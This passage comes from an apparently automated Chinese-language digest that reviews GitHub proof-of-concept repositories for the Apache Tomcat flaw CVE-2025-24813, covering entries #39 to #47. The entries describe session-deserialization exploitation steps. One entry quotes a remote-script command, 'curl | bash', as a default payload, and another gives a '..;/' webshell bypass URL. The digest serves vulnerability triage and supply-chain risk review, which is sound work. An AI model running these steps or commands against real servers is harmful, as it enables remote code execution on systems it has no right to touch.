1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
